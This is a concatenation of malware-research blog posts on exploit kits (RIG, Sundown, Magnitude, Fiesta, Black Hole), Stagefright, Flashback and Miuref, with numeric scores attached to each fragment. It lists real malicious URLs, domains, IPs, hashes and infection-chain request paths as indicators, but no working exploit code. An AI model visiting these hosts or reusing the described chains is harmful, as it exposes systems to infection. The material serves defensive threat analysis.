Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques.  His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.012931466658337332
"Exploit kits: Fall 2016 review
There have been interesting developments with exploit kits in the past few months to say the least, with the disappearance of some and the birth of others. However, one thing we noticed is that the new kits aren’t new per se, but rather variants or VIP versions of their predecessors.
Kahu Security recently published a beautiful visual (Wild Wild West – 11/2016) showing past and present crime kits. In this post we take a look at traffic captures collected from our own honeypots and via our telemetry, knowing that this is truly a snapshot at a particular time, as EKs keep on evolving.
Exploit Kits",0.01836428116548927
"RIG-v EK
RIG EK (standard)
RIG-E (Empire Pack)
Sundown EK
Bizarro Sundown EK
Magnitude EK
Neutrino-v EK",0.025627311904590777
"RIG-v EK
RIG-v is the VIP version of the regular RIG EK which started to appear in early September and showed Neutrino-like patterns. RIG-v is distributed via the Afraidgate and pseudoDarkleech campaigns as regularly exposed by Brad on Malware-Traffic-Analysis.net.
RIG-v introduced new URL patterns (more random) which could be used to differentiate it from regular RIG, although those were eventually added in some instances (clarification here.)of the classic RIG as well (can be seen here). At present, the content of RIG-v’s landing page is very distinct from its older brother with the use of unicode characters.",0.017690275125200716
Exploits,0.006498191279907806
"Internet Explorer: CVE-2016-0189 (IE9-IE11 ), CVE-2014-6332 (Godmode)
Flash Player: CVE-2015-8651 (up to version 20.0.0.228), CVE-2015-5122 (up to version 18.0.0.203)",0.015339318645658517
"Payload
Bunitu: 5fb0b32db7d7c92ec7f99166486cf9c2722fb6b0a523132dd53c548b24aefdc3
RIG EK (standard)
RIG is the underdog that took over from Neutrino when the latter briefly succeeded to Angler from June to September. For the most part in the past couple months, RIG has dominated the exploit kit landscape thanks to major distribution campaigns from compromised websites and malvertising.",0.013437499046121903
Exploits,0.006498191279907806
"Internet Explorer: CVE-2013-2551
Flash Player: CVE-2015-8651 (up to version 20.0.0.228), CVE-2015-5122 (up to version 18.0.0.203)",0.012436282205306237
"Payload
Neurevt Bot: 64230fb59e715d0c285a0190780505bcf9249bdf7d4fb92a905c8fd21172cf2a
RIG-E (Empire Pack)
Another RIG, this one also known as Empire Pack and distinct from the others by the original URL patterns. Note about the different RIG EKs here.",0.01196291710468389
Exploits,0.006498191279907806
"Internet Explorer: CVE-2013-2551
Flash Player: CVE-2015-8651 (up to version 20.0.0.228), CVE-2015-5122 (up to version 18.0.0.203)",0.012436282205306237
"Payload
Smoke Loader: 86b4714897c9062ce445e04e0068fa435b64ce5b1485f4a843b88aa3adc21253
Sundown EK/Xer
Sundown EK is usually quite discrete and mainly focuses on some particular geolocations, so no doubt the feeling one may experience when catching it in the wild. This EK has a habit of stealing code from others and regularly makes tweaks to its URL structure and flow. It seems also that the developpers (unsurprisingly) are taking notes from researchers and tweets pointing out some of its failures.",0.009306120247734362
Exploits,0.006498191279907806
"Internet Explorer: CVE-2015-2419
Flash Player: CVE-2016-4117 (up to version 21.0.0.213), CVE-2015-5119 (up to version 18.0.0.194)
Silverlight: CVE-2016-0034 (up to version 5.1.41105.0)",0.01424395213102203
"Payload
LizFlooder: 6eef933339f6c913522501d72c548730c52bab0c2ee527ca21956c96fd4ec9ec
Bizarro Sundown EK
Bizarro Sundown is actually a new exploit kit distributed via the WordsJS campaign but it would be easy to mistake it for Sundown since they both share many of the same features. We only caught a few instances of Bizarro Sundown perhaps because it is also very geo targeted and has more limited distribution.",0.011166410074677446
Exploits,0.006498191279907806
"Internet Explorer: CVE-2016-0189 (IE9-IE11 )
Flash Player: CVE-2016-4117 (up to version 21.0.0.213), CVE-2015-5119 (up to version 18.0.0.194)",0.012663747892456945
"Payload
Locky: 04e3cce4775868fcfb497de27979ea077623d0bc9707f86efd86ab0136227d3a
Magnitude EK
Magnitude was once more prominent and used in various malvertising attacks. Lately it seems to be keeping a lower profile with strong geo-targeting (South Korea) while still dropping its usual Cerber ransomware payload. Its gates are interesting to study, in particular for their use of fingerprinting techniques.",0.012244229733552547
Exploits,0.006498191279907806
"Internet Explorer: CVE-2016-0189 (IE9-IE11 )
Flash Player: CVE-2016-4117 (up to version 21.0.0.213)",0.01330011383776264
"Payload
Cerber: d7a44ff9049c12a714576c8dfaa93bff7c583dc2b2e871699dc86021e5073a4c
Neutrino-v EK
Neutrino-v is a variant of the regular Neutrino (the latter disappearing in late September) that we caught in limited malvertising attacks from adult websites. Its gate (not shown here) is very interesting due to improved obfuscation (anti debuggers) and fingerprinting code.",0.01198814936683057
Exploits,0.006498191279907806
"Internet Explorer: CVE-2016-0189 (IE9-IE11 ), CVE-2014-6332 (Godmode)
Flash Player: CVE-2016-4117 (up to version 21.0.0.213), CVE-2016-1019 (up to version 20.0.0.306), CVE-2015-8651 (up to version 20.0.228)
Information disclosure bugs: CVE-2013-7331",0.014276138176647635
"Payload
Gootkit?: 6d779a7271377610d7ab0b6f53b03c87f60a9001cb8676c03d74d1097b49b352
Protection
All of these exploit kits are detected and blocked by Malwarebytes Anti-Exploit.
Acknowledgements
Many thanks to @hasherezade for payload identification! I would also like to point out the positive work of researchers in the community who regularly share traffic captures (@malware_traffic, @BroadAnalysis, @Oddly_Normal) that have been helpful for so many to practice with and get a better understanding of exploit kits. Also, thanks to @criznash for the informal chats on EKs.
",0.011139042505053487
"Introducing Metaphor: Another Android Stagefright exploit
Researchers in Israel have come across a new way of exploiting the Stagefright vulnerability that was uncovered last year, and which affects the library that Android uses to analyze multimedia files.",0.017693643552175176
Sabrina Pagnotta,0.010147939730486444
7 Apr 2016 - 01:49PM,0.01100483456476764
"Researchers in Israel have come across a new way of exploiting the Stagefright vulnerability that was uncovered last year, and which affects the library that Android uses to analyze multimedia files.",0.018361370211428252
"Researchers in Israel have come across a new way of exploiting the Stagefright vulnerability that was uncovered last year, and which affects the library that Android uses to analyze multimedia files.",0.018361370211428252
"To recap, cybercriminals can execute malicious code through a harmful or compromised website – or a specially designed MMS – to steal information. There is, however, a free tool capable of detecting if the device is vulnerable to Stagefright.",0.011277757575690828
"But that’s not all. A recent paper by Hanan Be’er, a researcher with NorthBit, has found that an exploit known as ‘Metaphor’ can go further to take advantage of the vulnerability in Stagefright. He suggests that millions of Android devices are vulnerable to this exploit, which dodges their defense mechanisms. This threat operates on Android 2.2 to 4.0 and 5.0 to 5.1. On top of this, in the latest versions, it can evade the ASLR. This is ‘address space layout randomization’, used to hamper the proper operation of exploits preventing buffer overflow attacks.",0.008599771701231607
"As stated in The Register, the process is made up of various stages. Firstly, the victim lands on a malicious website. This then sends a video to the device, which crashes the multimedia server of the operating system in order to reset its internal state. JavaScript on the page waits for mediaserver to restart, and then sends information about the device over the internet to the attacker’s private server.",0.007987042628313401
"“When processed by Stagefright, the following video created by the attacker begins executing a payload which carries all the privileges it needs to spy on the user.”",0.01227529141723449
"This server then creates a custom video file which is sent to the device, which exploits Stagefright to reveal more information about the device’s internal state. When processed by Stagefright, the following video created by the attacker begins executing a payload which carries all the privileges it needs to spy on the user.",0.011004316240143197
The exploit attacks the CVE-2015-3864 bug – even without the user having to ‘play’ or view the video. It starts working when the web browser searches and analyzes the file. Stagefright is the native media player for Android devices.,0.01153156912848452
"“Our exploit works best on Nexus 5 devices. It was also tested on HTC One, LG G3, and Samsung S5 devices, although the exploit was slightly different on these brands. We will need to make a few adjustments”, concludes the analysis.",0.016759807479213684
"In any event, what we have to remember is that these exploits generated in test environments often present themselves as extremely critical problems, but we subsequently see that their actual scope is limited in highly specific scenarios. This attack also requires the execution of JavaScript over a web browser. As researchers have found, this type of code has a number of limitations.",0.00837441901424607
"This shows that there is no need to panic. Users should just keep up to date with the latest news and download patches when released by the provider.
",0.014839776074611066
"Attempting to achieve a higher click-through rate for their exploits and malware serving malicious campaign, cybercriminals are currently spamvertising millions of emails attempting to trick users into thinking they’ve become part of a private conversation about missing EPLI policies.
In reality, clicking on any of the links in the oddly formulated email will expose them to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.011243703723647136
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised and compromised URLs used in the campaign: hxxp://visage.ie/catalog/infourl.htm; hxxp://www.dace.nul.usb.ve/infourl.htm; hxxp://www.radclivecumchackmore.org.uk/drupal/sites/default/files/infourl.htm; hxxp://www.sgsoluciones.com.ar/sites/default/files/infourl.htm; hxxp://www.mv-ettlingenweier.de/sites/default/files/infourl.htm; hxxp://lanhaituandui.com/infourl.htm; hxxp://www.mv-ettlingenweier.de/sites/default/files/infourl.htm; hxxp://www.radclivecumchackmore.org.uk/drupal/sites/default/files/infourl.htm; hxxp://erotictrust.info/sites/all/themes/infourl.htm; hxxp://www.cardissa.fr/sites/default/files/infourl.htm; hxxp://mercurycube.com/infourl.htm; hxxp://www.fest-for-alle.dk/infourl.htm; hxxp://www.catriders.com/infourl.htm
Sample client-side exploits serving URL: hxxp://monacofrm.ru:8080/forum/links/column.php
Malicious domain name reconnaissance:
monacofrm.ru – 202.180.221.186, AS24496; 203.80.16.81, AS24514; 216.24.194.66, AS40676
Name server: ns1.monacofrm.ru – 62.76.178.233
Name server: ns2.monacofrm.ru – 41.168.5.140
Name server: ns3.monacofrm.ru – 132.248.49.112
Name server: ns4.monacofrm.ru – 209.51.221.247",0.015875629029757254
"The following malicious domains also respond to these IPs:
canadianpanakota.ru
lemonadiom.ru
peneloipin.ru
veneziolo.ru
forumibiza.ru
controlleramo.ru
moneymakergrow.ru
fionadix.ru
linkrdin.ru
geforceexlusive.ru
We’ve already seen lemonadiom.ru in another malicious campaign – “‘Fwd: Scan from a Xerox W. Pro’ themed emails lead to Black Hole Exploit Kit“, as well as linkrdin.ru in the following malicious campaigns: “‘Fwd: Scan from a Xerox W. Pro’ themed emails lead to Black Hole Exploit Kit“; “Cybercriminals spamvertise bogus ‘Microsoft License Orders’ serve client-side exploits and malware“. Clearly, these campaigns are operated by the same cybercriminal/gang of cybercriminals.
Sample detection rate for the javascript redirector: MD5: 65077fafa6632a43015320272c6a5776 – detected by 10 out of 44 antivirus scanners as Mal/JSRedir-M
Sample detection rate for a live client-side exploit: hxxp://monacofrm.ru:8080/forum/data/spn2.jar – SHANIKA.jar – MD5: d44ffa6065298d8b87900a7b9b16a494 – detected by 10 out of 44 antivirus scanners as Exploit.Java.CVE-2012-5076.A
Upon successful client-side exploitation, the campaign drops MD5: eadc019f64bbc6c162631db2430cb9a7 – detected by 15 out of 44 antivirus scanners as Trojan-Spy.Win32.Zbot.gkjh
We also know is that on 2012-11-12 10:58:07, the following client-side exploits serving domain was also responding to the same IP (202.180.221.186) – hxxp://canadianpanakota.ru:8080/forum/links/column.php. Upon successful client-side exploitation, this URL dropped MD5: 532bdd2565cae7b84cb26e4cf02f42a0 – detected by 33 out of 44 antivirus scanners as Worm:Win32/Cridex.E.
We’re also aware of two more client-side exploits serving domains responding to the same IP (202.180.221.186) on 2012-11-15 19:49:33 – hxxp://investomanio.ru/forum/links/public_version.php, and on the 2012-11-15 04:40:06 – hxxp://veneziolo.ru/forum/links/column.php.
Name servers part of the campaign’s infrastructure:
Name server: ns1.canadianpanakota.ru – 62.76.178.233
Name server: ns2.canadianpanakota.ru – 132.248.49.112
Name server: ns3.canadianpanakota.ru – 84.22.100.108
Name server: ns4.canadianpanakota.ru – 65.99.223.24
Name server: ns1.lemonadiom.ru – 85.143.166.170
Name server: ns2.lemonadiom.ru – 132.248.49.112
Name server: ns3.lemonadiom.ru – 84.22.100.108
Name server: ns4.lemonadiom.ru – 213.251.171.30
Name server: ns1.peneloipin.ru – 62.76.186.190
Name server: ns2.peneloipin.ru – 132.248.49.112
Name server: ns3.peneloipin.ru – 84.22.100.108
Name server: ns4.peneloipin.ru – 65.99.223.24
Name server: ns1.veneziolo.ru – 62.76.178.233
Name server: ns2.veneziolo.ru – 41.168.5.140
Name server: ns3.veneziolo.ru – 132.248.49.112
Name server: ns4.veneziolo.ru – 209.51.221.247
Name server: ns1.forumibiza.ru – 62.76.186.190
Name server: ns2.forumibiza.ru – 84.22.100.108
Name server: ns3.forumibiza.ru – 50.22.102.132
Name server: ns4.forumibiza.ru – 213.251.171.30
Name server: ns1.controlleramo.ru – 62.76.186.190
Name server: ns2.controlleramo.ru – 132.248.49.112
Name server: ns3.controlleramo.ru – 84.22.100.108
Name server: ns4.controlleramo.ru – 65.99.223.24
Name server: ns1.moneymakergrow.ru – 62.76.178.233
Name server: ns2.moneymakergrow.ru – 132.248.49.112
Name server: ns3.moneymakergrow.ru – 84.22.100.108
Name server: ns04.moneymakergrow.ru – 65.99.223.24
Name server: ns1.fionadix.ru – 62.76.186.190
Name server: ns2.fionadix.ru – 84.22.100.108
Name server: ns3.fionadix.ru – 50.22.102.132
Name server: ns4.fionadix.ru – 213.251.171.30
Name server: ns1.linkrdin.ru – 85.143.166.170
Name server: ns2.linkrdin.ru – 132.248.49.112
Name server: ns3.linkrdin.ru – 84.22.100.108
Name server: ns4.linkrdin.ru – 79.98.27.9
Name server: ns1.geforceexlusive.ru – 62.76.47.51
Name server: ns2.geforceexlusive.ru – 132.248.49.112
Name server: ns3.geforceexlusive.ru – 84.22.100.108
Name server: ns4.geforceexlusive.ru – 79.98.27.9
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011921795746330455
UTM Up2Date 9.307 Released,0.00861687136921252
"Written by
Eric Bégoc",0.010229904213713614
"February 02, 2015",0.009147129414465605
Network up2date UTM UTM 9,0.01007005226623292
"Today’s Up2Date package for Sophos UTM 9.3 will introduce  several fixes to our current UTM platform, including an update for glibc to fix potential vulnerability (GHOST, CVE-2015-0235).
For details on installation options and latest additions in this package please read on.",0.015906800232158957
"UTM 9.307006
News",0.00834398792792479
"Security Update
Update glibc to fix potential vulnerability (GHOST, CVE-2015-0235)",0.010956622532577232
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade",0.008729859254918315
Bugfixes,0.009816324567177737
"32724 improvements for the rpmdb check
33841 Mesh APs keep rebooting
33936 prevent “ulogd: ct1: nl_recvmsgs: Try again” error message in system.log
34164 [NUTM-424] frequent notifications about corrupted RPM Database
34347 glibc vulnerability (GHOST, CVE-2015-0235) [9.3]",0.009549671780404112
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.306006-307006.tgz.gpg",0.010280046556050748
"Up2date MD5sum:
5faeec001814274f0081bde652361044",0.009007051431775492
"File size:
~36MB",0.007951259522038456
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
Feedback",0.013947982400573822
"If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.01571937477116958
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Cyber-criminals quickly adopt critical Flash Player vulnerability
Keeping your computer up-to-date is probably one of the best pieces of advice one can give when it comes to online security.
Perhaps it should also be emphasized that patches ought to be applied in a timely fashion.
Case in point, less than a week ago, a critical flaw in the Flash Player (CVE-2014-0569) was patched and made public:",0.009535637775761385
"The vulnerability had been privately reported to Adobe through the Zero Day Initiative group giving the firm the time to fix the issue before it became known to the world.
Typically security researchers and criminals will be very attentive to such news and skilled reverse engineers will start looking at the patch to be able to reconstruct the exploit. All things considered, there is normally a certain amount of time before a proof of concept is released and then a little more time before that poc is weaponized by the bad guys.
You can imagine how surprised Kafeine was when he stumbled upon that same CVE in a real world exploit kit (Fiesta EK) only one week after the official security bulletin had been published!",0.012470339837193256
"Ooh! CVE-2014-0569 (identification by @TimoHirvonen ) fixed one week ago, is in Fiesta. (post will come later). pic.twitter.com/wArdOCl1Bt
— kafeine (@kafeine) October 21, 2014",0.012997138552924836
"Although this is not a zero day, one can imagine that there was a strong and urgent interest in exploiting this vulnerability in the wild.
That means we have less and less time to deploy and test security patches. Perhaps this is not too much of a deal for individuals, but it can be more difficult for businesses which need to roll out patches on dozens of machines, hoping doing so will not cause malfunctions in existing applications.
In any case, this was our first chance to test CVE-2014-0569 in the wild by triggering the Fiesta EK against Malwarebytes Anti-Exploit:",0.008141780106824204
"The server sends down the exploit landing page quickly followed by the new Flash exploit which is successfully blocked by Anti-Exploit.
We also observed another Flash exploit (we are not sure about which CVE is targeted yet, only that is was patched a week ago also) in the Angler EK:",0.014530770972638662
"It is crucial to patch any system running outdated Flash Player versions as soon as possible!
You can check the version you are running (make sure to do this in all the browsers you use) by going here.
To download the latest version click here (don’t forget to uncheck the pre-selected options to download toolbars or other Potentially Unwanted Programs AKA PUPs):
This slideshow requires JavaScript.
Browsing the Net on an unpatched computer is like playing the Russian roulette with a handful of loaded guns: “do you feel lucky?”.",0.014884611071756426
The first payload you get hit with is the infamous fileless malware also known as Bedep which enrolls you inside of a botnet:,0.00813038192440907
"Malwarebytes Anti-Malware detects the initial payload as Trojan.FakeMS.ED.
As they say, the rest is history, with more malware being downloaded and yet another machine ready to send out spam once it has been pick pocketed.
The bad guys are not going to run short of vulnerabilities they can weaponize at a quicker rate than ever before. This leaves end-users with very little room for mistakes such as failing to diligently apply security patches sooner rather than later.
Many thanks go to Kafeine for providing additional data on CVE-2014-0569. Feel free to read his original post here.
@jeromesegura
",0.00851765201964505
CVE-2010-0188 Adobe Exploit,0.00869621309200852
"Posted by Roger on 11 March 2010, 12:21 am",0.011917422196986993
"The Microsoft Malware Protection Center reported earlier this week a sighting of a malicious PDF file exploiting CVE-2010-0188. Adobe released 9.2.1 and 8.2.1 in February.
Users can pull down the ‘help’ menu and click on ‘check for updates’ to ensure that they’re running the latest version.
One lesson learned here is don’t skip deploying a patch just because no exploits are out for it. it will leave you scrambling later.
Adobe’s next scheduled Reader and Acrobat update is due April 13.
",0.01364223551542898
"Microsoft releases fix for IE Zero-Day
Microsoft disclosed information on a new Internet Explorer zero-day vulnerability yesterday in a security advisory.",0.0176800758311203
"Dubbed CVE-2013-3893, the vulnerability exists in SetMouseCapture within mshtml.dll, part of Internet Explorer 6 through 11.
Fortunately, Microsoft released a “Fix it” workaround that will patch mshtml.dll and remove the vulnerability. Internet Explorer users should apply the Fix It immediately.",0.007716467877987965
"While Microsoft stated this vulnerability has only been seen in “extremely limited, targeted attacks,” it’s likely we’ll see more of it in the coming days, and perhaps integrated into exploit kits.
Emerging Threats, a leading provider in Intrusion Detection System (IDS) rules, updated their free ruleset yesterday with three rules detecting this vulnerability.
Web browsers are frequently attacked by exploits, which in turn usually lead to malware infections. For this reason, it’s very important that users consider security when choosing a web browser.
However, even the most secure web browser isn’t perfect, so it’s always nice to have additional protection.
Malwarebytes Anti-Exploit is designed to safeguard users from exploits targeting various applications, including those targeting Internet Explorer.
We’re pleased to report that Malwarebytes Anti-Exploit users were already protected from this vulnerability prior to its public release, as the vulnerability uses a special technique to execute malicious code that’s already blocked by Malwarebytes Anti-Exploit.",0.01413361920981393
"If you’re interested in trying out Malwarebytes Anti-Exploit BETA, you can download it for free by clicking here.
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques. His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.015605112480942762
"Fighting the OSX/Flashback Hydra
The biggest Mac botnet ever encountered, the OSX/Flashback botnet, is being hit hard. On April 12th, Apple released a third Java update since the Flashback malicious code outbreak. This update includes a new tool called MRT (Malware Removal Tool) which allows Apple to quickly push malware removal code to their user base. The first mission",0.015686276340530103
13 Apr 2012 - 02:53PM,0.011396614411240291
"The biggest Mac botnet ever encountered, the OSX/Flashback botnet, is being hit hard. On April 12th, Apple released a third Java update since the Flashback malicious code outbreak. This update includes a new tool called MRT (Malware Removal Tool) which allows Apple to quickly push malware removal code to their user base. The first mission",0.01626780769379499
"The biggest Mac botnet ever encountered, the OSX/Flashback botnet, is being hit hard. On April 12th, Apple released a third Java update since the Flashback malicious code outbreak. This update includes a new tool called MRT (Malware Removal Tool) which allows Apple to quickly push malware removal code to their user base. The first mission of MRT: remove Flashback.",0.017358074000836443
"A lot of researchers and security companies have been interested in OSX/Flashback. Many have published observations and partial results, generating a lot of buzz. ESET has been actively investigating the OSX/Flashback botnet. ESET was one of the first companies to implement a sinkhole to monitor the botnet. We can confirm the magnitude of the infection spread reported by other companies: we have seen more than 491,793 unique IDs coming from over 749,113 unique IP addresses connecting to our sinkhole. We are actively collaborating with the security community, sharing the results of our reverse engineering efforts and sinkhole data.",0.017966581201405596
"The OSX/Flashback malware can infect computers by multiple means. In the last couple of months, we have seen it spread as a fake Adobe Flash player (hence its name) and through exploits. The bulk of the infections happened recently when a group of websites started distributing the malware through drive-by download, exploiting the CVE-2012-0507 vulnerability in Java.",0.011977281396016837
"The first stage component of OSX/Flashback is a dropper, its only functionality is to contact a command and control server, download additional components and run them. Some of the variants of the dropper we have seen would also load a library. When installed, the library will load with any application on the system. It hooks the system functions responsible for communication and is in a position to alter web pages and spy on users’ internet activity and behaviour. It is still unclear to us if this spying is used to display unsolicited advertisements in the browser of infected computers or to steal information.",0.01119625154235604
"When it comes to disclosing a realistic number of unique infected hosts, we strive to be as accurate and objective as possible. Defining a unique host is not trivial, even if OSX/Flashback uses hardware UUIDs. Our data indicates many UUIDs that connected to our sinkhole (a server we set up to capture incoming traffic from bot-infected machines trying to communicate with their command-and-control servers), came from a big range of IP addresses, indicating that there may be UUID duplicates. Virtual Machines or so-called Hack-intosh installations may explain this.",0.014057637887946117
"When browsing Hack-intosh forums, we found out that everyone who is using the fourth release candidate of a special distribution has the same hardware UUID (XXXXXXXX-C304-556B-A442-960AB835CB5D) and even discuss ways to arbitrarily modify it.",0.01168763872394063
"Oddly enough, we found this UUID connected to our sinkhole from 20 different IP addresses. This indicates that those who considered UUID to count the number of distinct infected hosts probably have underestimated the botnet size.",0.010304747012163662
Flashback evolved a lot in the last few months. The authors moved fast and added obfuscation and fallback methods in case the main C&C server is taken down. The dropper now generates 5 domain names per day and tries to get an executable file from those websites. The latest variants of the dropper and the library encrypt its important strings with the Mac hardware UUID. This makes it difficult for researchers to analyze a variant reported by a customer if they don’t also have access to the UUID.,0.009761753273596407
"The fallback mechanism that Flashback uses when it is unable to contact its C&C servers is quite interesting. Each day, it will generate a new Twitter hashtag and search for any tweet containing that hashtag. A new C&C address can be provided to an infected system this way. Intego reported this last month, but the latest version uses new strings. Twitter has been notified of the new hashtags and are working on remediations to make sure the operator of the botnet cannot take back control of his botnet through Twitter.",0.01473509073584467
"To protect your Mac OS X computers we highly recommend applying the latest update from Apple. In addition, users can also download a (free) trial version of ESET Cybersecurity for Mac to scan their computer for infection and clean any threat that might be found on the system.",0.013687646288542799
Thanks to Marc-Etienne Léveillé and Alexis Dorais-Joncas for their contribution to this research.,0.014459470263915364
"Pierre-Marc Bureau
Security Intelligence Program Manager
",0.010256198476948919
"Not old enough to be forgotten: the new chic of Visual Basic 6
2014-07-10",0.008695013140353702
"Marion Marschalek
Cyphort
,
USA
Editor:
Martijn",0.010310600280913351
"Grooten
Abstract
Marion Marschalek looks at the unusual case of Miuref samples that use two different runtime packers to protect against being analysed: one binary being wrapped in a C++ protector, and another in a Visual Basic 6 wrapper.
Copyright © 2014 Virus Bulletin",0.013335975201541839
"A while ago, our lab spotted an infection coming from the website of a popular men’s lifestyle magazine. I thought it was a nice coincidence that I had been assigned to that analysis, and wondered if there was any further motivation for the attack beyond just infecting anyone. Basing our assumption on the structure and the final payload of the infection, let’s assume there was not.
Within a day, we had determined that two binaries of the same malware family were being spread via the Fiesta Exploit Kit (EK), in both cases using the same exploit for the CVE-2013-2551 vulnerability. Both samples were dropped as NSIS-packed binaries containing an infector and an encrypted file which, once unpacked, resulted in a malicious DLL. That malicious library was identified as Miuref, a rather popular clickjack trojan.
What made this case particularly interesting were the different runtime packers that protect Miuref against being analysed. One binary was wrapped in a C++ protector (MD5: D4A38E03010E1DA7DE7D1B942FF222BA), while the other appeared in a Visual Basic 6 wrapper (MD5: B999D1AD460BD367275A798B5F334F37).",0.01268140812836116
"Malware delivery
Both samples were delivered via the same infection chain, beginning with the download of malicious JavaScript from the aforementioned magazine’s website.
The first request took the form ‘/js/responsive/min/main-b87ba20746a80e1104da210172b634c4.min.js’ and delivered JavaScript. This script first checked whether the user agent showed that MS Windows Internet Explorer was being used, and if it did, it deobfuscated a string constant that revealed the URL to be requested in the next step. The implication is that any browser other than Internet Explorer would have been safe from this attack.
The second request went to stat.litecsys.com/d2.php?ds=true&dr=2711950755, where the variable ‘dr’ is a randomly generated value.
The JavaScript at this stage differed between Internet Explorer versions 6–8 and 9–11. In both cases, the third request was directed to the domain vstat.feared.eu. For earlier versions of IE, the GET request remained static; for later versions, a variable, nrk, was randomly generated and attached to the request. Throughout the infection chain, it is clear that the attack was targeted specifically at Internet Explorer.
Figure 1. Distinguishing between current and early versions of IE.
Request number three resulted in a piece of JavaScript code packed with the Dean Edwards packer, which can easily be unpacked. The resulting script finally decoded the URL of the exploit-hosting server, using an ancient ROT13 algorithm.
Figure 2. ROT13 algorithm used to decrypt the URL.
Finally, a dedicated IE exploit was downloaded from g12z4pj3k4k9y4wd517-ll6.dienami.ru/. This was an exploit packed with Gzip and a Fiesta EK-specific packer, targeting CVE-2013-2551 (a use-after-free vulnerability in Internet Explorer versions 6 to 10, which was patched back in May 2013). The link to the Fiesta EK can be made via the final GET request for downloading the malicious binary: /f/1398361080/5/x007cf6b534e520804090407000700080150050f0304045106565601;1;5.",0.01253202798087083
"A thoroughly packaged payload
Both executables derived from this infection came as NSIS (Nullsoft Scriptable Install Systems) packed binaries. The NSIS unpacking scripts don’t seem to contain any maliciousness, so it seems likely that this stage was present just to package the resulting infector and the encrypted DLL (and probably to cause even more confusion than ultimately necessary).
Both samples, once decompressed, yielded an encrypted DLL and an infector. Both infectors appeared with legitimate icons and names, such as ‘KShortcutCleaner.exe’ or ‘NRWConfig.exe’, and were about 75–80KB in size. Meanwhile, the encrypted file in both cases came with the name ‘setup.dat’. However, a closer look at the infectors revealed that one was a C++ compiled binary, and the other a Visual Basic 6 binary.
My level of excitement went through the roof: there were clearly two pieces of malware from the same family, with different packers, one of which could cause a significant headache.
Visual Basic 6 has been the bane of analysts’ lives since the first pieces of VB6 malware reached epidemic levels at the beginning of the 2000s. Visual Basic is widely considered to produce the most hated binaries in the history of reverse engineering – indeed, on mentioning this topic to some reverse engineers, they didn’t know whether to laugh or to cry (and most of them did both).
The laughing vs. crying aspect of VB6 is primarily related to the fact that VB6 internals lack any sort of official documentation. The inner workings of the VB6 virtual machine and the functionality of its exported functions are literally a mystery to anyone who has not taken an in-depth look at msvbvm60.dll.
VB6 can be compiled to pseudo code or native code – neither of which is easy to understand, but the latter does at least result in x86 binary code. Meanwhile, pseudo code is VB6 byte code, interpreted by the VB6 virtual machine at runtime.
For native code reversing, it is crucial to understand the challenges of event-driven binaries. Also, the reverser must interpret the functionality of the VB6 APIs called from the binary. But, given that malware executes pretty linearly by nature, and the VB6 APIs are mostly assigned understandable names, native code reversing is just another colourful facet of x86 binaries.
Figure 3. Native code vs. pseudo code.
VB6 pseudo code, on the other hand, is a mess by design. Like some of the reversing challenges one finds at a Capture the Flag, or in very sophisticated runtime packers, VB6 pseudo code translates instructions to undocumented byte code and parses it through a VM – and has been doing so since the 1990s.
Valuable groundwork has been done by Jurriaan Bremer with VB6Tracer [1]. Visual Basic code, compiled to pseudo code, results in two- or four-byte instructions that are parsed by msvbvm60.dll. These VB6 instructions can be likened to indices which tell the VB6 VM which dedicated instruction handler to call. For the translation of byte codes, the virtual machine uses a function named ProcCallEngine that parses the byte code through six look-up tables. The single-byte instructions are looked up in the first table, where each instruction byte itself is the table index. All two-byte instructions are designed so that the first byte points to the right table, while the second byte is the index that leads to the right handler. This way, each table has a space of 256 instructions. Altogether, VB6 pseudo code makes use of no fewer than 800 instructions.
Figure 4. Byte code translation in VB6 pseudo code.
Visual Basic’s interface to Win32 and its APIs is supported either by calling the wrappers provided by msvbvm60.dll or by calling the original APIs via VB6’s DllFunctionCall wrapper. Msvbvm60.dll offers everything a Windows developer could dream of: __vbaPrintFile and __vbaStrComp, for example. Still, it is worth mentioning again that none of these exports are documented. Meanwhile, DllFunctionCall simply uses LoadLibraryA/GetProcAddress to get hold of a specific Windows API directly.",0.022901749603541854
"Classical analysis approaches
Thinking about it this way, pseudo code presents a bit of a black hole for reverse engineers. Every time a pseudo code instruction is interpreted, one might be tempted to dive into the dedicated instruction handler to determine the instruction’s purpose. But, given that VB6 pseudo code has a set of around 800 instructions, some of which are non-trivial, it could take a while to reverse engineer a binary.
As with many other structured byte code languages, pseudo code binaries come with a lot of management information that is very useful for decompilation. This works pretty well: pseudo code executables can be decompiled sufficiently to produce readable VB code. However, as soon as one meets a packed or heavily obfuscated binary, this purely static approach becomes infeasible. Getting back to the obfuscated VB6 binary at hand, one can easily see that decompilation is not fruitful.
